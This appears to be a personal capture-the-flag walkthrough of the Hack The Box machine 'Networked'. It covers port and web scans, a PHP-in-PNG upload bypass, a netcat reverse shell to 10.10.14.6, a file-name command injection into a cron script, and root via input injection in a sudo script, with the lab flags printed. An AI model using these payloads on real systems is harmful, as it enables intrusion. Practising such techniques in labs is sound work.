Networked ip:10.10.10.146

rustscan:

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

nmap:

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 2275d7a74f81a7af5266e52744b1015b (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDFgr+LYQ5zL9JWnZmjxP7FT1134sJla89HBT+qnqNvJQRHwO7IqPSa5tEWGZYtzQ2BehsEqb/PisrRHlTeatK0X8qrS3tuz+l1nOj3X/wdcgnFXBrhwpRB2spULt2YqRM49aEbm7bRf2pctxuvgeym/pwCghb6nSbdsaCIsoE+X7QwbG0j6ZfoNIJzQkTQY7O+n1tPP8mlwPOShZJP7+NWVf/kiHsgZqVx6xroCp/NYbQTvLWt6VF/V+iZ3tiT7E1JJxJqQ05wiqsnjnFaZPYP+ptTqorUKP4AenZnf9Wan7VrrzVNZGnFlczj/BsxXOYaRe4Q8VK4PwiDbcwliOBd
|   256 2d6328fca299c7d435b9459a4b38f9c8 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAsf1XXvL55L6U7NrCo3XSBTr+zCnnQ+GorAMgUugr3ihPkA+4Tw2LmpBr1syz7Z6PkNyQw6NzC3KwSUy1BOGw8=
|   256 73cda05b84107da71c7c611df554cfc4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILMrhnJBfdb0fWQsWVfynAxcQ8+SNlL38vl8VJaaqPTL
80/tcp open  http    syn-ack Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16



nikto:

nikto -h 10.10.10.146
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.10.10.146
+ Target Hostname:    10.10.10.146
+ Target Port:        80
+ Start Time:         2023-04-13 12:36:13 (GMT3)
---------------------------------------------------------------------------
+ Server: Apache/2.4.6 (CentOS) PHP/5.4.16
+ /: Retrieved x-powered-by header: PHP/5.4.16.
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ Apache/2.4.6 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ PHP/5.4.16 appears to be outdated (current is at least 8.1.5), PHP 7.4.28 for the 7.4 branch.
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing
+ PHP/5.4 - PHP 3/4/5 and 7.0 are End of Life products without support.
+ /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184
+ /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184
+ /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184
+ /backup/: Directory indexing found.
+ /backup/: This might be interesting.
+ /icons/: Directory indexing found.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ 8852 requests: 0 error(s) and 15 item(s) reported on remote host
+ End Time:           2023-04-13 12:47:56 (GMT3) (703 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested



gobuster:


gobuster dir -u 10.10.10.146 -w /usr/share/wordlists/dirb/common.txt -t 64 -x txt,php,html
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.146
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              txt,php,html
[+] Timeout:                 10s
===============================================================
2023/04/13 12:47:44 Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 207]
/.hta                 (Status: 403) [Size: 206]
/.htpasswd            (Status: 403) [Size: 211]
/.htaccess.html       (Status: 403) [Size: 216]
/.hta.txt             (Status: 403) [Size: 210]
/.htaccess            (Status: 403) [Size: 211]
/.htpasswd.txt        (Status: 403) [Size: 215]
/.hta.php             (Status: 403) [Size: 210]
/.htpasswd.php        (Status: 403) [Size: 215]
/.htpasswd.html       (Status: 403) [Size: 216]
/.hta.html            (Status: 403) [Size: 211]
/.htaccess.php        (Status: 403) [Size: 215]
/.htaccess.txt        (Status: 403) [Size: 215]
/backup               (Status: 301) [Size: 235] [--> http://10.10.10.146/backup/]
/cgi-bin/             (Status: 403) [Size: 210]
/cgi-bin/.html        (Status: 403) [Size: 215]
/index.php            (Status: 200) [Size: 229]
/index.php            (Status: 200) [Size: 229]
/lib.php              (Status: 200) [Size: 0]
/photos.php           (Status: 200) [Size: 1302]
/upload.php           (Status: 200) [Size: 169]
/uploads              (Status: 301) [Size: 236] [--> http://10.10.10.146/uploads/]
Progress: 18254 / 18460 (98.88%)
===============================================================
2023/04/13 12:48:11 Finished
===============================================================


What do we know?

Visiting the site on port 80, we find an interesting file called backup. We can download the php files of the site, therefore, we should be able reach them via gobuster.

Foothold:

we should be able to upload a php reverse shell, and activate it using /uploads folder in order to catch it.

as per uploads.php, we are restricted to add php files. we can try to add php code to a png file in order to get a proof of concept.


create a black png, and add php code to it

──(gabriel.hajdu㉿SVROLP01872)-[~/Practice/HTB/Networked]
└─$ convert -size 32x32 xc:black black.png

┌──(gabriel.hajdu㉿SVROLP01872)-[~/Practice/HTB/Networked]
└─$ ls
backup.tar  black.png  index.php  lib.php  photos.php  php-reverse-shell.jpg.php  php-reverse-shell.php  readme.txt  upload.php  white.png

┌──(gabriel.hajdu㉿SVROLP01872)-[~/Practice/HTB/Networked]
└─$ ristretto black.png 

┌──(gabriel.hajdu㉿SVROLP01872)-[~/Practice/HTB/Networked]
└─$ echo '<?php' >> black.png 

┌──(gabriel.hajdu㉿SVROLP01872)-[~/Practice/HTB/Networked]
└─$ echo 'passthru("whoami");' >> black.png 

┌──(gabriel.hajdu㉿SVROLP01872)-[~/Practice/HTB/Networked]
└─$ echo '?>' >> test.png

┌──(gabriel.hajdu㉿SVROLP01872)-[~/Practice/HTB/Networked]
└─$ echo '?>' >> black.png 

┌──(gabriel.hajdu㉿SVROLP01872)-[~/Practice/HTB/Networked]
└─$ mv black.png black.php.png


upload the black.php.png file to the server and go to uploads/image_name.php.png to check if we have a response

whoami got executed and we are :apache

let's create a new png image to add the appropiate php code to get a reverse connection:

┌──(gabriel.hajdu㉿SVROLP01872)-[~/Practice/HTB/Networked]
└─$ convert -size 32x32 xc:white empty.jpg

┌──(gabriel.hajdu㉿SVROLP01872)-[~/Practice/HTB/Networked]
└─$ cp empty.jpg ./shell.php.png

┌──(gabriel.hajdu㉿SVROLP01872)-[~/Practice/HTB/Networked]
└─$ echo '<?php' >> ./shell.php.png

┌──(gabriel.hajdu㉿SVROLP01872)-[~/Practice/HTB/Networked]
└─$ echo 'passthru("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.6 1337 >/tmp/f");' >> ./shell.php.png

┌──(gabriel.hajdu㉿SVROLP01872)-[~/Practice/HTB/Networked]
└─$ echo '?>' >> ./shell.php.png 

upload the file, set up a listener, and view the file to get a reverse shell:

┌──(gabriel.hajdu㉿SVROLP01872)-[~/Practice/HTB/Networked]
└─$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.146] 46946
sh: no job control in this shell
sh-4.2$ python -c 'import pty;pty.spawn("/bin/bash")'
python -c 'import pty;pty.spawn("/bin/bash")'
bash-4.2$ whoami
whoami
apache
bash-4.2$ 


lateral movement: how to get user guly:

bash-4.2$ touch '; nc 10.10.14.6 1338 -c bash'     
touch '; nc 10.10.14.6 1338 -c bash'
bash-4.2$ 


in the crontab, we see that check_attack.php has a vulnerable variable. we can use this to get a reverse shell as guly:

┌──(gabriel.hajdu㉿SVROLP01872)-[~/Practice/HTB/Networked]
└─$ nc -lvnp 1338
listening on [any] 1338 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.146] 46976
whoami
guly
python -c 'import pty;pty.spawn("/bin/bash")'
[guly@networked ~]$ pwd
pwd
/home/guly
[guly@networked ~]$ ls
ls
check_attack.php  crontab.guly	user.txt

user flag:


[guly@networked ~]$ cat user.txt
cat user.txt
1fb2a44bc2e6b831a9983e5d74c6dc45
[guly@networked ~]$ 




PrivEsc:

[guly@networked ~]$ sudo -l
sudo -l
Matching Defaults entries for guly on networked:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User guly may run the following commands on networked:
    (root) NOPASSWD: /usr/local/sbin/changename.sh
[guly@networked ~]$ 


[guly@networked ~]$ cat /usr/local/sbin/changename.sh
cat /usr/local/sbin/changename.sh
#!/bin/bash -p
cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
EoF

regexp="^[a-zA-Z0-9_\ /-]+$"

for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
	echo "interface $var:"
	read x
	while [[ ! $x =~ $regexp ]]; do
		echo "wrong input, try again"
		echo "interface $var:"
		read x
	done
	echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
done
  
/sbin/ifup guly0
[guly@networked ~]$ 

[guly@networked uploads]$ sudo /usr/local/sbin/changename.sh
sudo /usr/local/sbin/changename.sh
interface NAME:
bash
bash
interface PROXY_METHOD:
test
test
interface BROWSER_ONLY:
test
test
interface BOOTPROTO:
test
test
ERROR     : [/etc/sysconfig/network-scripts/ifup-eth] Device guly0 does not seem to be present, delaying initialization.
[guly@networked uploads]$ sudo /usr/local/sbin/changename.sh
sudo /usr/local/sbin/changename.sh
interface NAME:
test bash
test bash
interface PROXY_METHOD:
test
test
interface BROWSER_ONLY:
test
test
interface BOOTPROTO:
test
test
root@networked:/etc/sysconfig/network-scripts[root@networked network-scripts]# whoami
whoami
root
root@networked:/etc/sysconfig/network-scripts[root@networked network-scripts]# 

root@networked:~[root@networked ~]# cat root.txt
cat root.txt
7e9a8a35357a8a2c032c24df281b1e06



